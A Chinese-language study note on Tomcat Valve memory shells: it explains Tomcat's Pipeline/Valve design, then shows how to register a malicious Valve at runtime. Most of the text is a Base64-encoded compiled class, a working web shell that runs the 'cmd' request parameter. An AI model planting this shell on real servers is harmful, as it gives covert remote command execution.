---
category:
  - 网络安全
  - Web安全
  - Java
tags:
  - 内存马
  - Tomcat
  - Valve
  - Valve内存马
---

# Tomcat Valve内存马

> [JavaWeb 内存马一周目通关攻略 | 素十八 (su18.org)](https://su18.org/post/memory-shell/#tomcat-valve-内存马)

Tomcat 在处理一个请求调用逻辑时，是如何处理和传递 Request 和 Respone 对象的呢？

为了整体架构的每个组件的可伸缩性和可扩展性，Tomcat 使用了职责链模式来实现客户端请求的处理。在 Tomcat 中定义了两个接口：Pipeline（管道）和 Valve（阀）。

这两个接口名字很好的诠释了处理模式：数据流就像是流经管道的水一样，经过管道上个一个个阀门。

Pipeline 中会有一个最基础的 Valve（basic），它始终位于末端（最后执行），封装了具体的请求处理和输出响应的过程。Pipeline 提供了 `addValve` 方法，可以添加新 Valve 在 basic 之前，并按照添加顺序执行。

![img](http://cdn.ayusummer233.top/DailyNotes/202410221355048.jpg)

Tomcat 每个层级的容器（Engine、Host、Context、Wrapper），都有基础的 Valve 实现（StandardEngineValve、StandardHostValve、StandardContextValve、StandardWrapperValve），他们同时维护了一个 Pipeline 实例（StandardPipeline），也就是说，我们可以在任何层级的容器上针对请求处理进行扩展。这四个 Valve 的基础实现都继承了 ValveBase。这个类帮我们实现了生命接口及MBean 接口，使我们只需专注阀门的逻辑处理即可。

先来简单看一下接口的定义，`org.apache.catalina.Pipeline` 的定义如下：

![img](http://cdn.ayusummer233.top/DailyNotes/202410221358244.png)

`org.apache.catalina.Valve` 的定义如下：

![img](http://cdn.ayusummer233.top/DailyNotes/202410221420481.png)

具体实现的代码逻辑在 [Tomcat中容器的pipeline机制 - coldridgeValley - 博客园 (cnblogs.com)](https://www.cnblogs.com/coldridgeValley/p/5816414.html) 描述的比较好。

Tomcat 中 Pipeline 仅有一个实现 StandardPipeline，存放在 ContainerBase 的 pipeline 属性中，并且 ContainerBase 提供 `addValve` 方法调用 StandardPipeline 的 addValve 方法添加。

![img](http://cdn.ayusummer233.top/DailyNotes/202410221421873.png)

Tomcat 中四个层级的容器都继承了 ContainerBase ，所以在哪个层级的容器的标准实现上添加自定义的 Valve 均可。

添加后，将会在 `org.apache.catalina.connector.CoyoteAdapter` 的 `service` 方法中调用 Valve 的 `invoke` 方法。

![img](http://cdn.ayusummer233.top/DailyNotes/202410221422770.png)

这里我们只要自己写一个 Valve 的实现类，为了方便也可以直接使用 ValveBase 实现类。

里面的 `invoke` 方法加入我们的恶意代码，由于可以拿到 Request 和 Response 方法，所以也可以做一些参数上的处理或者回显。

然后使用 StandardContext 中的 pipeline 属性的 addValve 方法进行注册。

---

## 动态添加 Valve

![image-20241022144250864](http://cdn.ayusummer233.top/DailyNotes/202410221442991.png)

顺便看下 su18 师傅注入的 Valve 类:

![image-20241022155508712](http://cdn.ayusummer233.top/DailyNotes/202410221555916.png)

编译部署看看效果：

`/demo`:

![image-20241022163749314](http://cdn.ayusummer233.top/DailyNotes/202410221637489.png)

`/addValve`:

![image-20241022163851314](http://cdn.ayusummer233.top/DailyNotes/202410221638350.png)

`/demo`:

![image-20241022163913698](http://cdn.ayusummer233.top/DailyNotes/202410221639739.png)

---

## 注入恶意Valve

编写恶意 Valve:

![image-20241022164427147](http://cdn.ayusummer233.top/DailyNotes/202410221644209.png)

和项目一起编译出 Class, 编码为 Base64 字符串:

```
yv66vgAAAEEArgoAAgADBwAEDAAFAAYBACRvcmcvYXBhY2hlL2NhdGFsaW5hL3ZhbHZlcy9WYWx2ZUJhc2UBAAY8aW5pdD4BAAMoKVYIAAgBABh0ZXh0L2h0bWw7IGNoYXJzZXQ9VVRGLTgKAAoACwcADAwADQAOAQAmb3JnL2FwYWNoZS9jYXRhbGluYS9jb25uZWN0b3IvUmVzcG9uc2UBAA5zZXRDb250ZW50VHlwZQEAFShMamF2YS9sYW5nL1N0cmluZzspVggAEAEABVVURi04CgAKABIMABMADgEAFHNldENoYXJhY3RlckVuY29kaW5nCgAKABUMABYAFwEACWdldFdyaXRlcgEAFygpTGphdmEvaW8vUHJpbnRXcml0ZXI7CAAZAQAbSGVyZSBpcyBTdW1tZXJDTURWYWx2ZX48YnI+CgAbABwHAB0MAB4ADgEAE2phdmEvaW8vUHJpbnRXcml0ZXIBAAdwcmludGxuCAAgAQADY21kCgAiACMHACQMACUAJgEAJW9yZy9hcGFjaGUvY2F0YWxpbmEvY29ubmVjdG9yL1JlcXVlc3QBAAxnZXRQYXJhbWV0ZXIBACYoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nOwcAKAEAGGphdmEvbGFuZy9Qcm9jZXNzQnVpbGRlcgcAKgEAEGphdmEvbGFuZy9TdHJpbmcIACwBAAZ3aG9hbWkKACcALgwABQAvAQAWKFtMamF2YS9sYW5nL1N0cmluZzspVgoAJwAxDAAyADMBAAVzdGFydAEAFSgpTGphdmEvbGFuZy9Qcm9jZXNzOwoANQA2BwA3DAA4ADkBABFqYXZhL2xhbmcvUHJvY2VzcwEADmdldElucHV0U3RyZWFtAQAXKClMamF2YS9pby9JbnB1dFN0cmVhbTsHADsBABFqYXZhL3V0aWwvU2Nhbm5lcgoAOgA9DAAFAD4BABgoTGphdmEvaW8vSW5wdXRTdHJlYW07KVYIAEABAAJcYQoAOgBCDABDAEQBAAx1c2VEZWxpbWl0ZXIBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL3V0aWwvU2Nhbm5lcjsKADoARgwARwBIAQAHaGFzTmV4dAEAAygpWgoAOgBKDABLAEwBAARuZXh0AQAUKClMamF2YS9sYW5nL1N0cmluZzsIAE4BAAAIAFABAAFcCgApAFIMAFMAVAEACGNvbnRhaW5zAQAbKExqYXZhL2xhbmcvQ2hhclNlcXVlbmNlOylaCgA6AFYMAFcABgEABWNsb3NlBwBZAQATamF2YS9sYW5nL1Rocm93YWJsZQoAWABbDABcAF0BAA1hZGRTdXBwcmVzc2VkAQAYKExqYXZhL2xhbmcvVGhyb3dhYmxlOylWCABfAQACc2gIAGEBAAItYwgAYwEAB2NtZC5leGUIAGUBAAIvYwoAZwBoBwBpDABqAGsBABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsKAGcAbQwAbgBvAQAEZXhlYwEAKChbTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsKABsAcQwAcgAGAQAFZmx1c2gKABsAVgcAdQEAE2phdmEvbGFuZy9FeGNlcHRpb24KAHQAdwwAeAAGAQAPcHJpbnRTdGFja1RyYWNlCgB6AHsHAHwMAH0AfgEAHGNvbS9zdW1tZXIyMzMvU3VtbWVyQ01EVmFsdmUBAAdnZXROZXh0AQAdKClMb3JnL2FwYWNoZS9jYXRhbGluYS9WYWx2ZTsLAIAAgQcAggwAgwCEAQAZb3JnL2FwYWNoZS9jYXRhbGluYS9WYWx2ZQEABmludm9rZQEAUihMb3JnL2FwYWNoZS9jYXRhbGluYS9jb25uZWN0b3IvUmVxdWVzdDtMb3JnL2FwYWNoZS9jYXRhbGluYS9jb25uZWN0b3IvUmVzcG9uc2U7KVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEAHkxjb20vc3VtbWVyMjMzL1N1bW1lckNNRFZhbHZlOwEACG91dHB1dE9TAQASTGphdmEvbGFuZy9TdHJpbmc7AQAJc2Nhbm5lck9TAQATTGphdmEvdXRpbC9TY2FubmVyOwEADnJlc3BvbnNlV3JpdGVyAQAVTGphdmEvaW8vUHJpbnRXcml0ZXI7AQAGb3V0cHV0AQABcwEAB2lzTGludXgBAAFaAQAQcHJvY2Vzc0J1aWxkZXJPUwEAGkxqYXZhL2xhbmcvUHJvY2Vzc0J1aWxkZXI7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
```

编译部署看下效果:

`/demo`:

![image-20241022165457944](http://cdn.ayusummer233.top/DailyNotes/202410221654059.png)

`/addValve`:

![image-20241022165518352](http://cdn.ayusummer233.top/DailyNotes/202410221655406.png)

`/demo?cmd=id`:

![image-20241022165542315](http://cdn.ayusummer233.top/DailyNotes/202410221655364.png)

---



